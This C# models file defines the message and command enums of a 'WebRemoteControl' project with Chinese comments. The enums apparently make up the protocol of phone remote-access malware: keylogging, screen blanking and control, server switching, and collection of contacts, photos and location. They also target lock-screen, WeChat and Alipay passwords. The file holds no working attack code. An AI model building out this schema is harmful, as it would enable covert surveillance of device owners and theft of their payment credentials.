namespace WebRemoteControl.Core.Models;

/// <summary>
/// 网络消息类型
/// </summary>
public enum MessageType : byte
{
    /// <summary>
    /// 视频帧
    /// </summary>
    VideoFrame = 1,

    /// <summary>
    /// 控制命令
    /// </summary>
    ControlCommand = 2,

    /// <summary>
    /// 状态消息
    /// </summary>
    StatusMessage = 3,

    /// <summary>
    /// 自定义消息
    /// </summary>
    CustomMessage = 4,

    /// <summary>
    /// 心跳保活
    /// </summary>
    Keepalive = 5,

    /// <summary>
    /// 系统控制
    /// </summary>
    SystemControl = 6,

    /// <summary>
    /// 阅读器视频帧
    /// </summary>
    ReaderVideoFrame = 7,

    /// <summary>
    /// 摄像头帧
    /// </summary>
    CameraFrame = 8,

    /// <summary>
    /// 音频帧
    /// </summary>
    AudioFrame = 9,

    /// <summary>
    /// 崩溃日志
    /// </summary>
    CrashLog = 10,

    /// <summary>
    /// 应用日志
    /// </summary>
    AppLog = 11,

    /// <summary>
    /// 键盘日志
    /// </summary>
    KeyboardLog = 12
}

/// <summary>
/// 网络消息
/// </summary>
public class NetworkMessage
{
    /// <summary>
    /// 消息类型
    /// </summary>
    public MessageType Type { get; set; }

    /// <summary>
    /// 消息负载
    /// </summary>
    public byte[] Payload { get; set; } = Array.Empty<byte>();

    /// <summary>
    /// 消息时间戳
    /// </summary>
    public DateTime Timestamp { get; set; } = DateTime.Now;
}

/// <summary>
/// 系统控制命令类型
/// </summary>
public enum SystemCommandType : ushort
{
    /// <summary>
    /// 屏幕截图
    /// </summary>
    ScreenCapture = 1,

    /// <summary>
    /// 屏幕阅读器
    /// </summary>
    ScreenReader = 2,

    /// <summary>
    /// 屏幕控制
    /// </summary>
    ScreenControl = 3,

    /// <summary>
    /// 屏幕唤醒或锁定
    /// </summary>
    ScreenWakeOrLock = 4,

    /// <summary>
    /// 屏幕黑屏
    /// </summary>
    ScreenBlock = 5,

    /// <summary>
    /// 消息
    /// </summary>
    Message = 6,

    /// <summary>
    /// 应用列表
    /// </summary>
    AppList = 7,

    /// <summary>
    /// 联系人
    /// </summary>
    Contact = 8,

    /// <summary>
    /// 文件
    /// </summary>
    File = 9,

    /// <summary>
    /// 设备信息
    /// </summary>
    Device = 10,

    /// <summary>
    /// 密码
    /// </summary>
    Passwords = 11,

    /// <summary>
    /// 启动检查
    /// </summary>
    StartCheck = 12,

    /// <summary>
    /// 摄像头
    /// </summary>
    Camera = 13,

    /// <summary>
    /// 音频
    /// </summary>
    Audio = 14,

    /// <summary>
    /// 更改服务器
    /// </summary>
    ChangeServer = 15,

    /// <summary>
    /// 崩溃日志
    /// </summary>
    CrashLog = 16,

    /// <summary>
    /// 键盘日志
    /// </summary>
    KeyboardLog = 17,

    /// <summary>
    /// 相册
    /// </summary>
    Photo = 18,

    /// <summary>
    /// 位置
    /// </summary>
    Location = 19
}

/// <summary>
/// 默认操作类型
/// </summary>
public enum DefaultOperation
{
    /// <summary>
    /// 启动
    /// </summary>
    Start = 1,

    /// <summary>
    /// 停止
    /// </summary>
    Stop = 2,

    /// <summary>
    /// 第三个操作
    /// </summary>
    Third = 3,

    /// <summary>
    /// 列表
    /// </summary>
    List = 4,

    /// <summary>
    /// 详情
    /// </summary>
    Detail = 5,

    /// <summary>
    /// 添加
    /// </summary>
    Add = 6,

    /// <summary>
    /// 编辑
    /// </summary>
    Edit = 7,

    /// <summary>
    /// 删除
    /// </summary>
    Delete = 8,

    /// <summary>
    /// 重命名
    /// </summary>
    Rename = 9,

    /// <summary>
    /// 阻止
    /// </summary>
    Block = 10,

    /// <summary>
    /// 安装
    /// </summary>
    Install = 11,

    /// <summary>
    /// 卸载
    /// </summary>
    Uninstall = 12
}

/// <summary>
/// 密码类型
/// </summary>
public enum PasswordType
{
    /// <summary>
    /// 锁屏密码
    /// </summary>
    LockScreen = 1,

    /// <summary>
    /// 微信密码
    /// </summary>
    WeChat = 2,

    /// <summary>
    /// 支付宝密码
    /// </summary>
    Alipay = 3,

    /// <summary>
    /// 自动锁屏密码
    /// </summary>
    LockScreenAuto = 4
}

/// <summary>
/// 控制命令类型
/// </summary>
public enum ControlCommandType : byte
{
    /// <summary>
    /// 点击
    /// </summary>
    Tap = 1,

    /// <summary>
    /// 滑动
    /// </summary>
    Swipe = 2,

    /// <summary>
    /// 返回键
    /// </summary>
    Back = 3,

    /// <summary>
    /// Home 键
    /// </summary>
    Home = 4,

    /// <summary>
    /// 按键码
    /// </summary>
    KeyCode = 5,

    /// <summary>
    /// 任务键
    /// </summary>
    Task = 6
}

